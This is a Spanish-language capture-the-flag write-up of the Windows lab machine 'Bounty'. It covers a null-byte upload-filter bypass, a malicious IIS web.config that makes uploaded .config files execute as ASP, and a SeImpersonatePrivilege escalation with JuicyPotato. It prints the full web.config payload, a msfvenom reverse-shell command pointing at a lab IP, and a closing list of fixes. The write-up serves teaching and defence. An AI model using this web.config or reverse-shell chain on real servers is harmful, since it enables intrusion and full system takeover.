Resumen

Bounty es un Windows antiguo con un único servicio: un servidor web IIS que deja subir ficheros. La vía de entrada no es un fallo del código de subida, sino una peculiaridad de IIS: una carpeta puede reconfigurarse a sí misma con un web.config, y eso permite hacer que ejecute como código lo que debería servir como texto.

Subiendo un web.config malicioso a la carpeta de subidas consigo ejecución de comandos, y de ahí una shell como merlin.

La escalada es la clásica de un servidor Windows viejo con SeImpersonatePrivilege: con JuicyPotato se abusa de la suplantación de tokens para saltar a NT AUTHORITY\SYSTEM.

No es tan directa como promete su dificultad — hay que encadenar varios pasos y pelearse con los detalles — pero cada pieza es un patrón que conviene tener muy visto.

Vulnerabilidad

Son dos piezas, una por cada mitad de la máquina.

01 · Subida de ficheros + ejecución vía web.config

La web deja subir ficheros y filtra por extensión, pero el filtro es débil y, sobre todo, no contempla lo importante: en IIS, el fichero web.config configura el comportamiento de la carpeta donde está. Si puedo dejar un web.config en la carpeta de subidas, puedo decirle a IIS que ejecute los ficheros .config de esa carpeta como código ASP clásico — y de paso quitar .config de la lista de extensiones bloqueadas. Es una técnica conocida: subir configuración es, en la práctica, subir código.

02 · SeImpersonatePrivilege (abuso de tokens)

La cuenta de servicio de IIS tiene habilitado SeImpersonatePrivilege, el permiso para suplantar a un cliente tras autenticarlo. En un Windows de esta época eso es una escalada directa: herramientas de la familia Potato (aquí JuicyPotato) engañan a un servicio privilegiado para que se autentique contra ellas y les entregue su token, y con ese token se lanza un proceso como SYSTEM.

Explotación

Lo primero es ver qué acepta el formulario. Pruebo a subir directamente una webshell con extensión .aspx

Invalid File. Please try again — hay un filtro de extensiones. En cambio, una imagen .jpg sube sin problema

El primer intento de bypass es un byte nulo: interceptando con Burp, renombro el fichero a prueba.aspx%00.jpg. El filtro ve un .jpg al final y lo deja pasar, pero el byte nulo trunca el nombre y en disco se guarda como .aspx

El fichero sube, pero para que sirva de algo tiene que ejecutarse, y para eso necesito saber dónde aterminan las subidas y que esa carpeta interprete ASP. Ahí entra la técnica que de verdad resuelve la máquina.

El truco del web.config

En IIS, el fichero web.config configura la carpeta donde está. Si consigo dejar uno en la carpeta de subidas, reconfiguro esa carpeta a mi gusto. Lo compruebo primero con un web.config inofensivo que, además de la configuración, lleva una línea de ASP que escribe «hola»

<?xml version="1.0" encoding="UTF-8"?> <configuration><system.webServer> <handlers accessPolicy="Read, Script, Write"> <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" /> </handlers> <security><requestFiltering> <fileExtensions><remove fileExtension=".config" /></fileExtensions> <hiddenSegments><remove segment="web.config" /></hiddenSegments> </requestFiltering></security> </system.webServer></configuration> <% Response.Write("hola") %>

Lo subo

Y al visitarlo, la prueba sale perfecta: la carpeta de subidas es /UploadedFiles y el .config se ejecuta como código, no se sirve como texto

Ese web.config hace dos cosas clave en la carpeta: define un handler que manda cualquier .config al intérprete de ASP clásico (asp.dll), y quita .config de la lista de extensiones bloqueadas. Convierte /UploadedFiles en un sitio donde subir un .config con código dentro equivale a ejecutar.

Para la shell de verdad tiro de HackTricks, que documenta esta técnica y enlaza un ejemplo en el repositorio PayloadsAllTheThings

El web.config de ejemplo trae ya el código para ejecutar comandos: lee un parámetro cmd de la URL y lo pasa a WScript.Shell

Mención importante: descargando de GitHub con wget sobre una URL de tipo /blob/ se baja el HTML de la página, no el fichero. Hay que cambiar /blob/ por /raw/refs/heads/ (con curl -o pasa lo mismo)

Escalada de privilegios

Lo primero en un Windows es mirar los privilegios de la cuenta

PS C:\windows\system32\inetsrv> whoami /priv
Privilege Name Description State SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled

SeImpersonatePrivilege habilitado. En un Windows Server 2008 R2 eso es una escalada directa con JuicyPotato, que abusa de la suplantación de tokens. Se podría haber ido por el camino de systeminfo + un suggester de parches para buscar un exploit de kernel

…pero teniendo SeImpersonate delante, JuicyPotato es más limpio. Subo a C:\Windows\Temp el JuicyPotato.exe y un nc.exe con certutil

El primer intento, lanzando JuicyPotato para que ejecutara directamente nc.exe, no me funcionó por más vueltas que le di. La solución fue generar una reverse shell propia con msfvenom y pasársela a JuicyPotato como el ejecutable a lanzar

┌──(jaime㉿kali)-[~]└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.95 LPORT=1234 -f exe -o shell1234.exe

Con el .exe en la víctima, lanzo JuicyPotato apuntando a él

[+] authresult 0 {4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM [+] CreateProcessWithTokenW OK

Cómo se arregla

La cadena nace de una subida mal controlada y de un privilegio peligroso. Por capas:

  • Validar bien las subidas: no fiarse de la extensión, y menos de una lista negra. Validar el tipo real del fichero, renombrar lo subido y guardarlo fuera del webroot, en almacenamiento que no ejecute nada.
  • Bloquear web.config en las subidas: IIS no debería permitir que un usuario deje un web.config en una carpeta de subidas. La carpeta de uploads debe tener la ejecución de scripts deshabilitada y la escritura de configuración denegada.
  • No procesar byte nulo: sanear los nombres de fichero y rechazar caracteres de control como %00.
  • Quitar SeImpersonate a la cuenta web: es el privilegio que convierte un RCE de bajo nivel en SYSTEM. La cuenta del application pool debe correr con los mínimos privilegios y sin SeImpersonate/SeAssignPrimaryToken.
  • Actualizar el sistema: un Windows Server 2008 R2 está fuera de soporte; las familias Potato clásicas dejan de funcionar en versiones modernas con las mitigaciones al día.
